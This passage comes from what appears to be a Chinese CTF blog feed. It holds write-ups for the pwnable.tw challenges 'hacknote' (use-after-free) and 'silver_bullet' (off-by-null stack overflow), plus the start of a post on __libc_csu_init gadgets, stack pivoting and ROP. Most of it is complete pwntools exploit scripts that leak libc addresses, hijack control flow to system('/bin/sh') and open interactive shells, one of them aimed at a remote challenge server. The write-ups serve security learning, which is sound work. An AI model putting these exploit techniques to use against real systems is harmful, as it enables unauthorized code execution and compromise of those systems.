punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"35"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>eval<span class="token punctuation">(</span><span class="token string">"0xefffffff"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>远程的话其实它给了个libc，我们可以利用readelf和strings直接找出system和binsh的偏移，然后思路同上。</p><h3 id="hackone"><a href="#hackone" class="headerlink" title="hackone"></a>hackone</h3><p>拿到一个堆的题目首先分析它的数据结构：<br><img src="/2020/01/30/pwnablele-exercises/9.png" title="This is an image"></p><p>我们可以看到申请会同时生成两个堆块，第一个堆块用来存放输出函数所在的地址，第二个存在申请出来的另一个堆块的mem指针。<br><img src="/2020/01/30/pwnablele-exercises/10.png" title="This is an image"></p><p>它的show函数写的很奇妙，之前所说的第一个堆块的前半部分是函数指针，后半部分是参数，那么我们就可以改写其为system函数，同时用system的参数截断来实现利用，比如：</p><pre><code>&quot;||sh&quot;或者&quot;;sh&quot;</code></pre><p>这个程序的漏洞在于指针free后没有置NULL<br><img src="/2020/01/30/pwnablele-exercises/11.png" title="This is an image"></p><p>这就说明我们可以进行double free操作，我刚开始死活弄不出来就在于没有看出第一个堆块的后半部分是前半部分的参数，如果这样的话，其实不用double free，申请的时候直接申请一个0x10大小的chunk就会把之前free的拿回来，然后把其的后半部分改写成got表内容，就可以泄露地址了，然后把他改成system的就可以getshell了，同时还有一个解法就是利用fastin和unsorted_bin的合并，下面贴出一个脚本，但是包含两种解法。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./hacknote"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>local <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binary<span class="token comment" spellcheck="true">#context.log_level = "debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""    #第一种解法malloc(0x48,"a") #0malloc(0x48,"a") #1free(0)malloc(0x48,"a") #2show(0)r.recvuntil("\xf7")get = r.recvuntil("\xf7")libcbase = u64(get.ljust(8,"\x00")) - 0x1b37b0 + 0x1000system_addr = libcbase + libc.symbols["system"]confirm(system_addr)confirm(libcbase)free(0)free(1)payload = p32(system_addr) + ";/bin/sh\x00"malloc(0x58,payload)#gdb.attach(r)show(0)"""</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#第二种解法</span>malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>malloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x804862B</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\xf7"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">";sh\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h3><p>这个题目给我的感觉就是用栈实现的堆的操作一样，哈哈，既然是栈的题目，我们就比较关心到底开了什么保护。</p><pre><code>[*] &#39;/home/root0/pratice/pwnable/silver_bullet/silver_bullet&#39;    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>可以看到开启了Full RELRO和NX，我们分析程序逻辑。<br>首先在main函数的栈空间里面开辟了一段空间<br><img src="/2020/01/30/pwnablele-exercises/12.png" title="This is an image"></p><p>然后就是create_bullet函数，它的参数就是一个指向main函数开辟区域buf的指针。<br><img src="/2020/01/30/pwnablele-exercises/13.png" title="This is an image"></p><p>如果buf里面没有东西的话就会读入自己的输入，输入读入的长度，并将长度存储到了开辟的buf的下面。</p><p>然后就是power_up函数,它参数和create_bullet一样<br><img src="/2020/01/30/pwnablele-exercises/14.png" title="This is an image"></p><p>但是该函数在自己的栈空间里面开辟了一块新的区域，然后先判断有没有创建过bullet然后判断是否存满0x30,没有的话先读入到自己新开辟的s区域，然后接到原来的buf里面，但是这里明显漏洞啊，strncat在拼接字符串的时候会把字符串的”\x00”也拼接过去，这就类似于off-by-null了，而且程序只有这一个洞。</p><p>最后是beat函数：<br><img src="/2020/01/30/pwnablele-exercises/15.png" title="This is an image"></p><p><strong>利用方法</strong></p><p>我们只需要两次power_up就能实现栈溢出,但是我们由power_up函数就可以知道我们需要把power_up接上的字符长度小一点，因为这个长度会被赋给size,这样我们可以栈溢出了，随后的操作就很平常了。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearchercontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>local <span class="token operator">=</span> <span class="token number">0</span>exec_binary <span class="token operator">=</span> <span class="token string">'./silver_bullet'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binaryelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"chall.pwnable.tw"</span><span class="token punctuation">,</span><span class="token number">10103</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span> libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">" ==> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    break_point <span class="token operator">=</span> <span class="token string">'b *'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\nc'</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span> break_point<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"of bullet :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">power_up</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"of bullet :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">beat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc_32.so.6"</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x8048954</span>create<span class="token punctuation">(</span><span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x2f</span><span class="token punctuation">)</span>power_up<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\xff\xff\xff"</span> <span class="token operator">+</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>power_up<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug(0x8048A18)</span>beat<span class="token punctuation">(</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You win !!\n"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\xff\xff\xff"</span> <span class="token operator">+</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x2f</span><span class="token punctuation">)</span>power_up<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>power_up<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>beat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># beat()</span><span class="token comment" spellcheck="true"># debug(0x8048984)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 64位万能gadget &amp; 栈迁移 &amp; rop</title>
      <link href="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/"/>
      <url>/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-64位万能gadget-amp-栈迁移-amp-rop"><a href="#linux-64位万能gadget-amp-栈迁移-amp-rop" class="headerlink" title="linux 64位万能gadget &amp; 栈迁移 &amp; rop"></a>linux 64位万能gadget &amp; 栈迁移 &amp; rop</h1><p>用一个例题(下面有题目链接)为例子，下面是它的关键函数：<br><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/1.png" title="This is an image"><br>最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读入超长数据，自然想到了栈迁移，但是我们看下保护。</p><pre><code>[*] &#39;/home/root0/pratice/pwn/pwn50&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>NX开了，而且bss段没有可执行权限，那么我们不能向bss段读入shellcode，那么我们就可以利用rop技术，但是程序不大，所以用ROGgadget不能够找到合适的gadget段，但是，对于64位linux程序，只要调用了libc.so，那么就会有通用的gadget。</p><h3 id="万能gadget-libc-csu-init"><a href="#万能gadget-libc-csu-init" class="headerlink" title="万能gadget :__libc_csu_init()"></a>万能gadget :<strong>__libc_csu_init()</strong></h3><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/2.png" title="This is an image"><p>从0x40068A这里开始,rbx,rbp,r12,13,r14,r15，都会布置好，最后的哪个 。。。下面引用先知上一个大佬的文章，写的很详细。</p><h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>其实简单的说就是控制执行两次leave_ret ，栈里面把ebp/rbp的值改成目的址-8，就可以了,同时，可能比较疑惑的一点是bss段没有可执行权限，如果有权限的话就可以直接读入shellcode来实现getshell，由于没有权限的原因，我们只能采用rop的方式来进行控制，因为rop和bss段是否有执行权限无关。<br>这个题目的脚本可以用来了解一下，同时下面有个参考链接。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearchercontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn50'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400693</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000040060F</span>bss_addr <span class="token operator">=</span> <span class="token number">0x000000000601060</span>  <span class="token operator">+</span> <span class="token number">0x400</span>puts_ret_addr <span class="token operator">=</span> <span class="token number">0x601378</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn50"</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> <span class="token number">0x0000000004004C0</span>main_addr <span class="token operator">=</span> <span class="token number">0x00000000040061D</span>rop <span class="token operator">=</span> <span class="token punctuation">[</span>    pop_rdi_ret<span class="token punctuation">,</span>    puts_got<span class="token punctuation">,</span>    puts_plt<span class="token punctuation">,</span>    main_addr<span class="token punctuation">,</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bss:\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">792</span> <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">232</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">10</span>payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00\x00"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token 